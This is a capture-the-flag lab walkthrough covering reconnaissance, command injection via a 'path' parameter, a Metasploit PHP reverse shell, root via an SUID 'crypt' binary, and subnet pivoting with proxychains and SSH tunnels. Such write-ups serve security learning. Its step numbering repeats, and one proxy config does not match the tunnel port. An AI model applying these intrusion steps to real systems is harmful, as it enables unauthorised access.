


## Enumeration


1. running an initial nmap scan on our target IP to see which ports are open and get an overview of the target's structure. We find two ports hosting SSH which is weird and another weird service on port 2222, but lets turn our initial focus to the webserver on port 80 as none of the service version numbers we say in the scan have known vulnerabilities.

```
┌──(kali㉿kali)-[~/Documents/labs/contain]
└─$ nmap -sV -sC -o nmap.txt 10.114.131.19
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-26 08:45 SAST
Nmap scan report for 10.114.131.19
Host is up (0.25s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a6:3e:80:d9:b0:98:fd:7e:09:6d:34:12:f9:15:8a:18 (RSA)
|   256 ec:5f:8a:1d:59:b3:59:2f:49:ef:fb:f4:4a:d0:1d:7a (ECDSA)
|_  256 b1:4a:22:dc:7f:60:e4:fc:08:0c:55:4f:e4:15:e0:fa (ED25519)
80/tcp   open  http          Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  EtherNetIP-1?
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
8022/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.13ppa1+obfuscated~focal (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 07:a6:f3:22:26:ea:53:bd:d6:91:3f:7c:90:2a:c2:10 (RSA)
|   256 34:65:2f:34:c1:9a:6f:00:bc:c9:dc:ae:03:18:36:03 (ECDSA)
|_  256 95:38:fd:4a:bc:f9:3b:06:93:55:41:79:e7:24:d3:71 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 201.97 seconds

```

2. The webserver just shows the default Apache info page at the root directory so our next step is to run a directory scan using FFUF
```                                             
┌──(kali㉿kali)-[~/Documents/labs/contain]
└─$ ffuf -u http://10.114.131.19/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.html,.asp 

```

3. We find the directory of index.php, which shows a blank page with some other directory names listed on it and inspected the page source code we see a weird comment left by the lab developer outputted below
```
<html>
<body>
	<pre>
	total 28K
drwxr-xr-x 2 root root 4.0K Jul 16  2021 .
drwxr-xr-x 3 root root 4.0K Jul 15  2021 ..
-rw-r--r-- 1 root root  11K Jul 15  2021 index.html
-rw-r--r-- 1 root root  154 Jul 16  2021 index.php
-rw-r--r-- 1 root root   20 Jul 15  2021 info.php
	<pre>

<!--  where is the path ?  -->

</body>
</html>
```

4. Index.html just redirects to the same default Apache server info page as the home directory, but info.php gives us the page which details the web servers configuration and version details and is the next place we need to investigate to find the flag.

5. We found the host name in this page and the PHP version number of 7.2.24, so I added the hostname to our `/etc/hosts` as `host1.lxd` and continued exploring

6. I initially ran a subdomain scan but found nothing than I pivoted to thinking about path structure and the hint given to us of `where is the path?` and tried all the known files with the addition of the path keyword in the URL to see if maybe this is the way.

7. We got a hit on index.php where we type in `http://host1.lxd/index.php?path=/home` where I used the word 'home' just to see the type of response we get from the server and we received a hit with the page source code this output

```
<html>
<body>
	<pre>
	total 12K
drwxr-xr-x  3 root root 4.0K Jul 19  2021 .
drwxr-xr-x 22 root root 4.0K Jul 15  2021 ..
drwxr-xr-x  5 mike mike 4.0K Jul 30  2021 mike
	<pre>

<!--  where is the path ?  -->

</body>
</html>

```

8. looking at the `/mike` directory we get the output pasted below, but exploring any of these directories just resulted in empty pages. We tried navigating to other folders but it seems like the server is only able to list the files in a certain directory and not output all files which is useful information and means it reads certain commands
```
<html>
<body>
	<pre>
	total 384K
drwxr-xr-x 5 mike mike 4.0K Jul 30  2021 .
drwxr-xr-x 3 root root 4.0K Jul 19  2021 ..
lrwxrwxrwx 1 root mike    9 Jul 19  2021 .bash_history -> /dev/null
-rw-r--r-- 1 mike mike  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 mike mike 3.7K Apr  4  2018 .bashrc
drwx------ 2 mike mike 4.0K Jul 30  2021 .cache
drwx------ 3 mike mike 4.0K Jul 30  2021 .gnupg
-rw-r--r-- 1 mike mike  807 Apr  4  2018 .profile
drwx------ 2 mike mike 4.0K Jul 19  2021 .ssh
-rwxr-xr-x 1 mike mike 351K Jul 30  2021 1cryptupx
	<pre>

<!--  where is the path ?  -->

</body>
</html>
```

9. I decided to use MSFCONSOLE to generate URL rce code that I could past in the search bar and get a shell on the server. I used this module `exploit(multi/script/web_delivery)`, set the payload to `set payload php/meterpreter/reverse_tcp`, my LHOST option, and target to PHP and ran it to get shell.

10. I ran a bunch of Local enumeration commands but found it very limiting where I could navigate to an from within the system. So I decided to ran an SUID command check to see files with specific SUID conditions and got these results with the crypt file looking intersting
```
www-data@host1:/$ find / -perm -4000 2>/dev/null     
find / -perm -4000 2>/dev/null
/usr/share/man/zh_TW/crypt
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/at
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/bin/mount
/bin/ping
/bin/su
/bin/umount
/bin/fusermount
/bin/ping6

```

11. In this directory we find the crypt script and an empty directory called `man1`. Running the crypt script returns just a banner output which is confusing and not much so I tried piping commands to the script but got no such like. It wasn't until I ran `./crypt mike` to see if you it requires a user to work and do something that I realized it gave me root privileges just like that!
```
www-data@host1:/usr/share/man/zh_TW$ ./crypt mike
./crypt mike
whoami
root
```

12. Once root I navigated to the root directory of the server but found nothing that pointed me towards the flag or its location. I ran some find commands to find files in the system with the word `flag` in its name but also found nothing. At this point I was stuck and not sure where to *pivot* to next, which turned out to be the exact thing I should've down - pivoting. I have experience with pivoting but never came across it in a "medium" difficulty THM lab so didn't even think about it until getting stuck.

13. running `ifconfig` confirmed it was pivoting based on the output showing an external network interface at `eth1` 172.16.20.2
```
root@host1:/usr/share/man/zh_TW# ifconfig
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.250.10  netmask 255.255.255.0  broadcast 192.168.250.255
        inet6 fe80::216:3eff:fe9c:ff0f  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:9c:ff:0f  txqueuelen 1000  (Ethernet)
        RX packets 174  bytes 114950 (114.9 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 273  bytes 28238 (28.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.20.2  netmask 255.255.255.0  broadcast 172.16.20.255
        inet6 fe80::216:3eff:fe46:6b29  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:46:6b:29  txqueuelen 1000  (Ethernet)
        RX packets 28  bytes 2272 (2.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 16  bytes 1256 (1.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 80  bytes 9150 (9.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 80  bytes 9150 (9.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

14. So at this point I knew I had to pivot and to do so we need to establish a connection between our local kali machine and the secondary subnet of the target machine. To do this I ran the MSF socks proxy module with this command `use auxiliary/server/socks_proxy`, set the version option via, `set VERSION 4a` and `exploit`. 

15. I then edited my proxychains config file to point to my local port where I wanted the connection to be established. To do this just type in the command `sudo nano /etc/proxychains4.conf`, scroll down to the bottom till you see something similar as below and edit and save it.
```
[ProxyList]
# add proxy here ...
# meanwile 
# defaults set to "tor"
socks4  127.0.0.1 9050
```

16. Once this was setup I ran this nmap scan on the entire subnet range to find alive hosts and determine which IP was the most likely to hold our flag or be the our target. 
```
proxychains nmap -sn -n 172.16.20.0/24 -T5
```

17. This turned out to be a pretty big waste of  time as we got way to many live hosts results to determine or point us into the right direction of who the actual host is we are meant to be targeting. So to try narrow our list down even further I decided to run a scan that would filter out hosts which weren't displaying commonly used ports as open as I assumed our target should at least be showing us something we can use to identify it, but this could also easily turn into a waste of time if the target isn't displaying any of these ports as open. 
```
proxychains nmap -sT -Pn -n --open -p 445,3389,80,22 172.16.20.0/24
```
17. I had to do some research on the exact next steps and found some good resources which explained how I need to connect via SSH and add this connection to the proxychains config file to run NMAP and others tools on the pivoting network. I ran this command to set up the connection `ssh -D localhost:9001 -f -N andrea@10.114.132.25` and than added the configuration below to setup proxychains and run the scans I need
```
[ProxyList]
# add proxy here ...
# meanwile 
# defaults set to "tor"
socks4  127.0.0.1 9050

```
16. We can now run nmap with this command and find all the available hosts we can pivot too `proxychains nmap -F 172.16.20.0/24`. However the results of these scans weren't being displayed nicely and seemed to be sporadic or just glitchy in terms of output. So instead I just took a list of all the discovered IPs from this scan and run more specific scans on them, where if it seemed the scan was taking very long(often indicating host is down), I just skipped that IP and moved to the next one.